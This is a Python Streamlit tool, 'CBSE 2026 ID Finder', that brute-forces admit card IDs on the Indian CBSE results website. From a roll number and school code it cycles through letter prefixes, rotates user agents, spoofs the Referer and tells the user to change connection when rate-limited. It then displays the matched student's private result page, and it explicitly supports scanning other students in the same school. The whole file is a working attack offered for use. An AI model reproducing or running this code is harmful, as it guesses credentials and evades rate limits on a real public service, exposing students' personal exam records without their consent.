import streamlit as st
import requests
from bs4 import BeautifulSoup
import itertools
import string
import time
import random
from concurrent.futures import ThreadPoolExecutor

st.set_page_config(page_title="CBSE Engine", page_icon="📝")

st.title("CBSE 2026 ID Finder")
st.caption("Made by Legionnaire")

st.divider()

# --- Disclaimer ---
st.info("Notice: School Code and Admit Card Suffix need not be changed if you are scanning for students in your same school/center block.")

# --- Main Page Inputs (Mobile First Layout) ---
st.subheader("Target Parameters")
col1, col2, col3 = st.columns(3)

with col1:
    roll_no = st.text_input("Roll Number", value="18602421")
with col2:
    school_code = st.text_input("School Code", value="45498")
with col3:
    fixed_suffix = st.text_input("Admit Card Suffix", value="4510")

st.subheader("Execution Settings")
col4, col5, col6 = st.columns(3)

with col4:
    # 3-Letter mode removed completely
    scan_mode = st.radio(
        "Search Depth:", 
        ["Ultra-Short (1 Letter)", "Standard (2 Letters)"],
        index=1
    )
with col5:
    # Concurrency capped strictly between 1 and 5
    threads = st.slider("Threads (Concurrency):", 1, 5, 3)
with col6:
    start_combo = st.text_input("Start From:", value="AA").upper()

include_spaces = st.checkbox("Include Space padding", value=True)

base_url = "https://cbseresults.nic.in/class_xii_b_2026_a/ClassTwelfth_ii26.htm"
post_url = "https://cbseresults.nic.in/class_xii_b_2026_a/ClassTwelfth_ii_2026.asp"

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
]

def check_id_sync(combo):
    admit_id = f"{combo}{roll_no[-2:]}{fixed_suffix}"
    session = requests.Session()
    session.headers.update({
        'User-Agent': random.choice(UA_POOL),
        'Referer': base_url,
        'Connection': 'close'
    })
    
    try:
        r_init = session.get(base_url, timeout=7)
        soup = BeautifulSoup(r_init.text, 'html.parser')
        
        payload = {'regno': roll_no, 'sch': school_code, 'admid': admit_id}
        for h in soup.find_all('input', type='hidden'):
            payload[h.get('name')] = h.get('value', '')
        payload['B2'] = 'Submit'

        time.sleep(random.uniform(0.1, 0.2))
        response = session.post(post_url, data=payload, timeout=7)
        
        if "Roll No" in response.text and "Invalid" not in response.text:
            return "SUCCESS", (admit_id, response.text)
        if "Access Denied" in response.text:
            return "BLOCKED", combo
    except:
        pass
    return "FAIL", combo

def run_scan():
    vowels = ['A', 'E', 'I', 'O', 'U']
    chars = vowels + [c for c in string.ascii_uppercase if c not in vowels]
    if include_spaces:
        chars.append(" ")
        
    depth = 1 if "1 Letter" in scan_mode else 2
    all_combos = ["".join(c) for c in itertools.product(chars, repeat=depth)]
    
    try:
        start_idx = all_combos.index(start_combo)
        search_space = all_combos[start_idx:]
    except ValueError:
        search_space = all_combos

    progress_bar = st.progress(0)
    status_text = st.empty()
    found = False

    st.info(f"Scan active: Cycling through {len(search_space)} combinations.")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_combo = {executor.submit(check_id_sync, combo): combo for combo in search_space}
        
        for i, future in enumerate(future_to_combo):
            try:
                res_type, data = future.result()
            except:
                continue
            
            done = i + 1
            progress_bar.progress(min(done / len(search_space), 1.0))
            
            display_id = data[0] if res_type == "SUCCESS" else data
            status_text.write(f"Testing: '{display_id}' | Progress: {done}/{len(search_space)}")

            if res_type == "SUCCESS":
                admit_id, html = data
                st.success(f"Match found: {admit_id}")
                st.components.v1.html(html, height=800, scrolling=True)
                found = True
                executor.shutdown(wait=False, cancel_futures=True)
                break
            
            if res_type == "BLOCKED":
                st.error(f"IP limited at ID '{data}'. Change connection and resume.")
                executor.shutdown(wait=False, cancel_futures=True)
                return

    if not found:
        st.warning("Scan complete. No matching ID found.")

if st.button("Start Scan"):
    run_scan()
